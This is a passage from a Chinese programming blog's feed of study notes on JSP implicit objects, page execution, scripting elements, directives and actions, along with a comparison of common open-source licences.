href="#3-1、session对象" class="headerlink" title="3.1、session对象"></a>3.1、session对象</h3><p>Web服务器为单个用户发送的多个请求创建会话；存储有关用户会话的所有信息；javax.servlet.http.HttpSession接口的实例；<code>session对象的作用范围在跳转页面后仍然有效</code>。</p><h3 id="3-2、application对象"><a href="#3-2、application对象" class="headerlink" title="3.2、application对象"></a>3.2、application对象</h3><p>表示jsp页面所属的应用程序；应用程序的jsp页面组合起来形成一个应用程序，适用范围最广的上下文状态。它允许jsp页面的servlet与包括在同一应用程序中的任何web组件共享信息；javax.servlet.ServletContext接口实例。<code>application对象的作用范围在跳转页面后失效</code>。</p><h3 id="3-3、pageContext对象"><a href="#3-3、pageContext对象" class="headerlink" title="3.3、pageContext对象"></a>3.3、pageContext对象</h3><p>使用户可以访问页面作用域中定义的所有隐式对象；他的作用范围是在同一页面；javax.servlet.jsp.PageContext类的实例；是jsp页面本身的上下文；提供唯一一个API来管理具有不同作用域的属性；在实现jsp自定义标记处理程序时使用的非常多；<code>pageContext对象的作用范围在跳转页面后仍然有效</code>。</p><h2 id="四、Servlet对象"><a href="#四、Servlet对象" class="headerlink" title="四、Servlet对象"></a>四、Servlet对象</h2><p>JSP引擎为每个JSP生成一个Servlet；Servlet的对象提供了访问Servlet信息的方法和变量；Servlet对象包括：page和config。</p><h3 id="4-1、page对象"><a href="#4-1、page对象" class="headerlink" title="4.1、page对象"></a>4.1、page对象</h3><p>使用page对象可以访问Servlet类的所有变量和方法；java.lang.Object类的</p><h3 id="4-2、page对象"><a href="#4-2、page对象" class="headerlink" title="4.2、page对象"></a>4.2、page对象</h3><p>存储在便宜JSP页面的过程中刚创建的信息；javax.servlet.ServletConfig接口的实例；提供了检索Servlet的初始化参数的方法；</p><h2 id="五、Exception对象"><a href="#五、Exception对象" class="headerlink" title="五、Exception对象"></a>五、Exception对象</h2><p>exception对象用于处理JSP页面中的错误；exception对象用于访问执行JSP的过程中引发的异常；exception对象是java.lang.Throwable类的实例；</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> JSP </tag>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见代码许可证对比</title>
      <link href="/2016/12/10/licence/"/>
      <url>/2016/12/10/licence/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>目前主流的许可证为GPL、LGPL、AGPL、MIT、Apache、BSD、Mozilla</p><h2 id="二、协议类别"><a href="#二、协议类别" class="headerlink" title="二、协议类别"></a>二、协议类别</h2><h3 id="GPL"><a href="#GPL" class="headerlink" title="GPL"></a>GPL</h3><p>GPL全称为<code>GNU General Public License</code>（GNU通用公共许可协议），缩写为<code>GNU GPL</code> 或 <code>GPL</code>，<code>GPL</code> 保证了所有开发者的权利，同时为使用者提供了足够的复制，分发，修改的权利，但是新增代码只能使用相同的许可证。</p><p>目前GPL协议存在三个不同的版本，关于不同版本的详细协议内存，请参考：<a href="%5Bhttps://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv1%5D(https://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv1)">GPL V1</a>、<a href="%5Bhttps://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv2%5D(https://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv2)">GPL V2</a>、<a href="%5Bhttps://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv3%5D(https://zh.wikipedia.org/wiki/GNU%E9%80%9A%E7%94%A8%E5%85%AC%E5%85%B1%E8%AE%B8%E5%8F%AF%E8%AF%81#GPLv3)">GPL V3</a></p><p><strong>采用该协议的代表作品</strong>：EMACS、部分Linux核心代码、GCC</p><h3 id="LGPL"><a href="#LGPL" class="headerlink" title="LGPL"></a>LGPL</h3><p><code>LGPL</code>的全称为<code>GNU Lesser General Public License</code>（GNU 宽通用公共许可证），旧称为<code>GNU Library General Public License</code>（GNU 库通用公共许可证）。允许商业软件通过类库引用（link）方式使用LGPL类库而不需要开源商业软件的代码。这使得采用LGPL协议的开源代码可以被商业软件作为类库引用并发布和销售。</p><p><strong>采用该协议的代表作品</strong>：Checkstyle、GTK等</p><h3 id="MIT"><a href="#MIT" class="headerlink" title="MIT"></a>MIT</h3><p><code>MIT</code>全称为<code>The MIT License</code>（MIT许可协议），又称<code>X License</code>（X许可协议）或 <code>X11 License</code>（X11许可协议），MIT 协议是所有开源许可中最宽松的一个，除了必须包含许可声明外，再无任何限制，核心条款如下：</p><p>该软件及其相关文档对所有人免费，可以任意处置，包括使用，复制，修改，合并，发表，分发，再授权，或者销售。唯一的限制是，软件中必须包含上述版 权和许可提示，这意味着：</p><ul><li>你可以自由使用，复制，修改，可以用于自己的项目；</li><li>可以免费分发或用来盈利；</li><li>唯一的限制是必须包含许可声明；</li></ul><p><strong>采用该协议的代表作品</strong>：PuTTY、X Window、Expat、Ruby on Rails、Lua等</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p><code>Apache</code>全称为<code>Apache License</code>（Apache许可证），兼容<code>GPL V3</code>，<code>Apache 协议 2.0</code> 和别的开源协议相比，除了为用户提供版权许可之外，还有专利许可。Apache 协议还有以下需要说明的地方：</p><ul><li><code>永久权利</code>：一旦被授权，永久拥有；</li><li><code>全球范围的权利</code>：在一个国家获得授权，适用于所有国家。假如你在美国，许可是从印度授权的，也没有问题；</li><li><code>授权免费，且无版税</code>：前期，后期均无任何费用；</li><li><code>授权无排他性</code>：任何人都可以获得授权；</li><li><code>授权不可撤消</code>：一旦获得授权，没有任何人可以取消。比如，你基于该产品代码开发了衍生产品，你不用担心会在某一天被禁止使用该代码；</li></ul><p><strong>采用该协议的代表作品</strong>：PyCharm、Kubernetes、TensorFlow、TypeScript、MathJax等</p><h3 id="Mozilla"><a href="#Mozilla" class="headerlink" title="Mozilla"></a>Mozilla</h3><p><code>Mozilla</code>全称为<code>Mozilla Public License</code>（Mozilla公共许可证），简称为MPL</p><h3 id="BSD"><a href="#BSD" class="headerlink" title="BSD"></a>BSD</h3><p><code>BSD</code>在软件分发方面的限制比别的开源协议（如 <code>GNU GPL</code>）要少。该协议有多种版本，最主要的版本有两个：</p><ul><li><code>新BSD协议</code>：<ul><li>在软件分发方面，除需要包含一份版权提示和免责声明之外，没有任何限制；</li><li>禁止拿开发者的名义为衍生产品背书，但简单 BSD 协议删除了这一条款</li></ul></li><li><code>简单BSD协议</code>：<ul><li>在软件分发方面，除需要包含一份版权提示和免责声明之外，没有任何限制；</li></ul></li></ul><p><strong>采用该协议的代表作品</strong>：React、Tor、Go、V8（JavaScript引擎）、Homebrew等</p><h2 id="三、选择拓扑图"><a href="#三、选择拓扑图" class="headerlink" title="三、选择拓扑图"></a>三、选择拓扑图</h2><p><img src="https://cdn.bugwz.com/licence-topology.png" alt="协议选择拓扑图"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Licence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP页面执行过程-JSP笔记-4</title>
      <link href="/2016/12/02/jsp-4/"/>
      <url>/2016/12/02/jsp-4/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>Eclipse Java EE IDE for Web Developers.<br>  Version: Neon.1a Release (4.6.1)</li><li>Apache Tomcat version: 8.0.39</li></ol><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><blockquote><p>整体过程感受：</p></blockquote><p>当我们请求WEB容器中的JSP页面时，WEB容器便将被访问的页面交给JSP引擎去处理。Tomcat中的JSP引擎就是一个Servlet程序，它负责解释和执行JSP页面。</p><p>每个JSP页面在第一次被访问时，JSP引擎先将它翻译成一个Servlet源程序，接着再把这个Servlet源程序编译成Servlet的class类文件，然后再由WEB容器像调用普通Servlet程序一样的方式来装载和解释执行这个由JSP页面翻译成的Servlet程序。</p><p>由于每台服务器的环境不同，具体的由Tomcat中的JSP引擎转译的源码地址也就不一样。在我本机的环境中，我可以通过查看控制台的相关提示，就可以快速找到与我项目中jsp文件对应的java文件和class文件。示例图如下。(当然如果你实在想了很多办法也没能找到jsp转译的相关文件位置，那就用最笨的方法，来个具体盘搜索，或者直接来个全盘搜索，搜索格式为：jsp文件名+_jsp+.java)</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fade9ok91ij30pc0csdii.jpg" alt="Console Infos"></p><blockquote><p>JSP的具体执行过程如下：</p></blockquote><ol><li>客户端发出请求。</li><li>Web容器将JSP转译成Servlet源代码。</li><li>Web容器将产生的源代码进行编译。</li><li>把执行结果响应至客户端。</li></ol><blockquote><p>总结如下：</p></blockquote><p>JSP执行过程：</p><ol><li>首先，客户端发出请求(request )，请求访问JSP网页</li><li>接着，JSP Container将要访问的.JSP文件 转译成Servlet的源代码（.java文件）</li><li>然后，将产生的Servlet的源代码（.java文件）经过编译，生成.class文件，并加载到内存执行</li><li>最后把结果响应(response )给客户端</li></ol><p>补充：执行JSP网页文件时，需要经过两个时期：转译时期(TranslationTime)和请求时期(RequestTime)。</p><ul><li><p>转译时期：JSP转译成Servlet类(.class文件)。</p><ul><li>将JSP网页转译为Servlet源代码(.java)，此段称为转译时期(Translation time)；将JSP网页转译为Servlet源代码(.java)，此段称为转译时期(Translation time)；</li><li>将Servlet源代码(.java)编译成Servlet类(.class)，此阶段称为编译时期(Compilation time)。<br>其实，JSP就是一个Servlet。</li></ul></li><li><p>请求时期：Servlet类(.class文件)执行后，响应结果至客户端。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> JSP </tag>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP脚本元素指令与动作JSP笔记-5</title>
      <link href="/2016/12/02/jsp-5/"/>
      <url>/2016/12/02/jsp-5/</url>
      
        <content type="html"><![CDATA[<h2 id="一、JSP脚本元素："><a href="#一、JSP脚本元素：" class="headerlink" title="一、JSP脚本元素："></a>一、JSP脚本元素：</h2><p>由于都是在一定的格式里起纳入Java代码，因此经常把“表达式”、Scriptlet、“声明”都称为脚本元素。</p><h3 id="1-1、JSP表达式："><a href="#1-1、JSP表达式：" class="headerlink" title="1.1、JSP表达式："></a>1.1、JSP表达式：</h3><p>JSP表达式是对数据的表示，系统将其作为一个值进行计算和显示。示例代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;jspDemo1.jsp&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;JSP表达式 示例&lt;/h1&gt;</span><br><span class="line">    &lt;!-- 常量,方法值,算术运算,关系运算 --&gt;</span><br><span class="line">    &lt;b&gt;PI 的值： &lt;/b&gt;&lt;%=Math.PI %&gt;&lt;br /&gt;</span><br><span class="line">    &lt;b&gt;<span class="number">100</span>,<span class="number">99</span>中最大的值 :&lt;/b&gt;&lt;%=Math.max(<span class="number">100</span>,<span class="number">99</span>) %&gt;&lt;br /&gt;</span><br><span class="line">    &lt;b&gt;<span class="number">100</span>,<span class="number">99</span>中最小的值 :&lt;/b&gt;&lt;%=Math.min(<span class="number">100</span>,<span class="number">99</span>) %&gt;&lt;br /&gt;</span><br><span class="line">    &lt;b&gt;<span class="number">3</span>+<span class="number">2</span>-<span class="number">5</span>的值 :&lt;/b&gt;&lt;%=<span class="number">3</span>+<span class="number">2</span>-<span class="number">5</span> %&gt;&lt;br /&gt;</span><br><span class="line">    &lt;b&gt;(<span class="number">3</span>+<span class="number">2</span>)==<span class="number">5</span>的值 :&lt;/b&gt;&lt;%=(<span class="number">3</span>+<span class="number">2</span>)==<span class="number">5</span> %&gt;&lt;br/&gt;</span><br><span class="line">    &lt;b&gt;(<span class="number">3</span>+<span class="number">2</span>)!=<span class="number">5</span>的值(表达式输出) :&lt;/b&gt;&lt;%=(<span class="number">3</span>+<span class="number">2</span>)!=<span class="number">5</span> %&gt;&lt;br /&gt;</span><br><span class="line">    &lt;!-- out.print() 与表达式作用类似 --&gt;</span><br><span class="line">    &lt;b&gt;&lt;%out.println(<span class="string">&quot;(3+2)!=5的值(out.print输出) :&quot;</span>+((<span class="number">3</span>+<span class="number">2</span>)!=<span class="number">5</span>)); %&gt;&lt;br/&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="1-2、JSP-Scriptlet："><a href="#1-2、JSP-Scriptlet：" class="headerlink" title="1.2、JSP Scriptlet："></a>1.2、JSP Scriptlet：</h3><p>JSP Scriptlet就是在JSP页面里面嵌入一段Java代码，也成为脚本代码段，它在JSP页面中的表现形式为:&lt;% Java代码 %&gt;，代码示例如下:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;jspDemo2.jsp&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;java 程序片 示例&lt;/h1&gt;</span><br><span class="line">    &lt;%</span><br><span class="line">      <span class="comment">//java程序片 定义一个变量 (结论:局部变量,反复声明,数值不变)</span></span><br><span class="line">      <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">      i++;</span><br><span class="line">     %&gt;</span><br><span class="line">     &lt;h1&gt;你是第&lt;%=i %&gt;个访问本站的用户&lt;/h1&gt;</span><br><span class="line">     &lt;br&gt;</span><br><span class="line">     &lt;!-- java 程序片 写具体代码 --&gt;</span><br><span class="line">     &lt;h1&gt;以直角三角形的形式显示数字&lt;/h1&gt;</span><br><span class="line">     &lt;%</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;<span class="number">10</span>;k++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=k;j++) &#123;</span><br><span class="line">           out.println(j);</span><br><span class="line">        &#125;</span><br><span class="line">     out.println(<span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">      %&gt;</span><br><span class="line">      &lt;h1&gt;计算<span class="number">1</span>到<span class="number">100</span>的和&lt;/h1&gt;</span><br><span class="line">      &lt;%</span><br><span class="line">        <span class="comment">//计算1到100的和</span></span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">100</span>;k++)&#123;</span><br><span class="line">    sum+=k;</span><br><span class="line">    &#125;</span><br><span class="line">    out.println(<span class="string">&quot;sum=&quot;</span>+sum);</span><br><span class="line">      %&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="1-3、JSP声明："><a href="#1-3、JSP声明：" class="headerlink" title="1.3、JSP声明："></a>1.3、JSP声明：</h3><p>JSP声明就是在JSP页面中声明Java方法或变量等(用于定义JSP代表的Servlet类的成员变量和方法)。JSP声明在JSP页面中的表现形式为：&lt;%! Java 代码 %&gt;，实例代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;jspDemo3.jsp&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;java 声明变量和方法 示例&lt;/h1&gt;</span><br><span class="line">&lt;%!<span class="comment">//声明变量 变量类型为java允许的任何类型 (结论:全局变量即类的成员变量,只声明一次,i数值递增)</span></span><br><span class="line"><span class="type">int</span> i, a, b = <span class="number">10</span>, c;</span><br><span class="line"><span class="type">String</span> <span class="variable">tom</span> <span class="operator">=</span> <span class="literal">null</span>, jerry = <span class="string">&quot;love JSP&quot;</span>;</span><br><span class="line">Date date;</span><br><span class="line"><span class="comment">//声明方法</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;Hello,&quot;</span> + name + <span class="string">&quot;!&quot;</span>;</span><br><span class="line">&#125;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">i++;</span><br><span class="line"><span class="comment">//给变量进行赋值操作</span></span><br><span class="line">date = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">%&gt;</span><br><span class="line">&lt;h1&gt;</span><br><span class="line">你是第&lt;%=i%&gt;个访问本站的用户</span><br><span class="line">&lt;/h1&gt;</span><br><span class="line">&lt;br&gt;&lt;%=jerry%&gt;</span><br><span class="line">&lt;br&gt;&lt;%=tom%&gt;</span><br><span class="line">&lt;br&gt;&lt;%=date%&gt;</span><br><span class="line">&lt;br&gt;&lt;%=sayHello(<span class="string">&quot;zhangsan&quot;</span>)%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>有个问题：</strong></p><p>当两个或多个线程同时访问同一个共享的变量时，并且一个线程需要修改这个变量时，我们应对这样的问题做出处理，否则可能发生混乱。根据Tomcat服务器的机制，Tomcat会为每个访问网站的用户开启一个新的线程，当多个用户同时请求一个JSP页面时，JSP页面的程序片（&lt;%  %&gt;中的）就会被多次调用运行，分别运行在不同的线程中，JSP页面的成员变量和方法（&lt;%! %&gt;）会被多个用户共享和访问。有些JSP页面的方法在操作成员变量，可能不需要被其他用户影响，以免产生不利影响，那么就要使用线程同步了，相当于加了一把锁。这样就能保障不同的用户对于同一个数据的处理时，不会发生混乱。</p><p><strong>synchronized修饰的作用为：当一个线程在执行被synchronized修饰的方法时，其他线程想在程序片中调用这个synchronized修饰的方法时就必须等待，直等到方法执行完。</strong></p><p>关于线程同步的方法有两种：</p><p>1.使用同步块进行线程同步：<code>synchronized(object)&#123;要同步的语句&#125;</code>，实例代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;关于线程同步的两个措施&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;<span class="keyword">synchronized</span>块 实现线程同步&lt;/p&gt;</span><br><span class="line">&lt;%! </span><br><span class="line"><span class="comment">//声明Integer 对象</span></span><br><span class="line">Integer number=<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">0</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;% </span><br><span class="line"><span class="comment">//把i++操作放入synchronized块中</span></span><br><span class="line"><span class="keyword">synchronized</span>(number)</span><br><span class="line">&#123;</span><br><span class="line">Thread.sleep(<span class="number">5000</span>);</span><br><span class="line"><span class="type">int</span> i=number.intValue();</span><br><span class="line">i++;</span><br><span class="line">number=<span class="keyword">new</span> <span class="title class_">Integer</span>(i);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;P&gt;您是第&lt;%=number.intValue()%&gt;个访问本站的客户。</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>2.使用同步方法进行线程同步：<code>synchronized void methodA()&#123;&#125;</code>,实例代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;jspDemo3_2.jsp&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;方法前加<span class="keyword">synchronized</span>关键字 实现线程同步&lt;/h1&gt;</span><br><span class="line">&lt;%!<span class="comment">//定义变量</span></span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//声明方法 </span></span><br><span class="line"><span class="comment">//public void countPeople() </span></span><br><span class="line"><span class="comment">//synchronized修饰方法</span></span><br><span class="line"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">countPeople</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">Thread.sleep(<span class="number">5000</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">try&#123;</span></span><br><span class="line"><span class="comment">Thread.sleep(5000);</span></span><br><span class="line"><span class="comment">&#125;catch(Exception e)&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">i++;</span><br><span class="line">&#125;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">countPeople();</span><br><span class="line">%&gt;</span><br><span class="line">&lt;P&gt;</span><br><span class="line">您是第&lt;%=i%&gt;个访问本站的客户。</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="二、JSP指令："><a href="#二、JSP指令：" class="headerlink" title="二、JSP指令："></a>二、JSP指令：</h2><p>(编译指令)相当于在编译期间的命令(换句话说jsp转换成Servlet过程期间需要用到的指令)，其中JSP指令包括page、include、taglib等。</p><h3 id="2-1、page指令："><a href="#2-1、page指令：" class="headerlink" title="2.1、page指令："></a>2.1、page指令：</h3><p>Page指令用来定义整个JSP页面的一些属性和这些属性的值。属性值总是用单引号或双引号括起来，可以用一个page指令制定多个属性的值，也可以用多个page为单个属性指定值。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一个page指令制定多个属性的值</span></span><br><span class="line">&lt;%@ page 属性<span class="number">1</span>=<span class="string">&quot;属性一的值&quot;</span> 属性<span class="number">2</span>=<span class="string">&quot;属性二的值&quot;</span> ... %&gt;</span><br><span class="line"><span class="comment">//多个page指令制定多个属性的值</span></span><br><span class="line">&lt;%@ page 属性<span class="number">1</span>=<span class="string">&quot;属性一的值&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page 属性<span class="number">2</span>=<span class="string">&quot;属性二的值&quot;</span>%&gt;</span><br></pre></td></tr></table></figure><p>另外page指令常用与进行错误页面的跳转，这其中一定会包括两个页面，一个是出错的页面，一个是出错后要跳转到的页面，部分代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//出错页面的page指令信息</span></span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> errorPage=<span class="string">&quot;error.jsp&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出错后跳转到的页面的page指令信息</span></span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> isErrorPage=<span class="string">&quot;true&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2、include指令："><a href="#2-2、include指令：" class="headerlink" title="2.2、include指令："></a>2.2、include指令：</h3><p>include指令用于在运行时将html文件或者jsp页面嵌入到另一个jsp页面(为了代码的复用，写好的jsp页面可以被所有的其他jsp页面进行银行用)，部分代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  include指令包含,静态包含特点:</span><br><span class="line">  <span class="number">1</span>,先包含后处理,生成一个servlet类.</span><br><span class="line">    即当前jsp页面和插入的文件合并成一个新的jsp文件,然后JSP引擎再将这个新的JSP页面转译成java文件</span><br><span class="line">  <span class="number">2</span>,只生成一个class文件</span><br><span class="line">  <span class="number">3</span>,不能传参数</span><br><span class="line">  <span class="number">4</span>,同一个request对象</span><br><span class="line">  --%&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;includeDemo1.jsp&lt;/h1&gt;</span><br><span class="line">    &lt;!-- 特点<span class="number">1</span>:包含文件定义变量i,被包含文件定义相同变量i时,报错 原因:先包含后处理,定义变量重复--&gt;</span><br><span class="line">    &lt;%</span><br><span class="line">       <span class="type">int</span> i=<span class="number">100</span>;</span><br><span class="line">     %&gt;</span><br><span class="line">     i=&lt;%=i %&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;!--  特点<span class="number">2</span>:查看work下项目的临时文件--&gt;</span><br><span class="line">&lt;!-- 特点<span class="number">3</span>:不能传参数 --&gt;</span><br><span class="line">    &lt;!--  特点<span class="number">4</span>:包含页面和被包含页面访问的是同一个request内嵌对象--&gt;</span><br><span class="line">&lt;%request.setAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;xiaoming&quot;</span>);%&gt;</span><br><span class="line">&lt;%System.out.println(<span class="string">&quot;includeDemo1.jsp中request=&quot;</span>+request); %&gt;</span><br><span class="line">&lt;%<span class="meta">@include</span> file=<span class="string">&quot;include1.jsp&quot;</span> %&gt; </span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br></pre></td></tr></table></figure><h3 id="2-3、taglib指令："><a href="#2-3、taglib指令：" class="headerlink" title="2.3、taglib指令："></a>2.3、taglib指令：</h3><p>taglib指令的作用是在jsp页面中，将<code>标签库描述符文件</code>引入到该页面中，并设置前缀，而去利用标签的<code>前缀</code>去使用标签库表述文件中的标签。部分代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!-- 引入JSTL标签 --&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;taglib标签引用&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;c:out value=<span class="string">&quot;欢迎测试你的第一个使用到JSTL的网页&quot;</span>/&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="三、JSP动作"><a href="#三、JSP动作" class="headerlink" title="三、JSP动作"></a>三、JSP动作</h2><p>jsp动作包括include，param，forward，plugin，useBean等动作，详细介绍如下所示：</p><h3 id="3-1、param动作："><a href="#3-1、param动作：" class="headerlink" title="3.1、param动作："></a>3.1、param动作：</h3><p>param标签以“名字–值”对的形式为其他标签提供附加信息，这个标签与jsp:include、jsp:forward、jsp:plugin标签一起使用。param动作标记语法格式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;jsp:param name=<span class="string">&quot;名字&quot;</span> value=<span class="string">&quot;指定param的值&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><h3 id="3-2、include动作："><a href="#3-2、include动作：" class="headerlink" title="3.2、include动作："></a>3.2、include动作：</h3><p>include动作的特点为：</p><ol><li>先处理后包含,生成多个servlet类。即能自动区分包含的文件是静态文件还是动态文件；执行时,如果为静态文件,直接将资源包含处理,与静态包含相同；如果为动态文件,则选各自处理资源,之后将处理后的结果包含在一起。</li><li>生成多个class文件</li><li>能传参数</li><li>不同一个request对象,可以取得包含它的页面的参数,并添加了自己的参数</li></ol><p>include动作的标记语法格式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;jsp:include page=<span class="string">&quot;文件的URL&quot;</span> /&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;jsp:include page=<span class="string">&quot;文件的URL&quot;</span>&gt;</span><br><span class="line">&lt;/jsp:include&gt;</span><br></pre></td></tr></table></figure><h3 id="3-3、动态include和静态include的区别如下："><a href="#3-3、动态include和静态include的区别如下：" class="headerlink" title="3.3、动态include和静态include的区别如下："></a>3.3、动态include和静态include的区别如下：</h3><ol><li><code>&lt;%@ include file=&quot;date.jsp&quot; 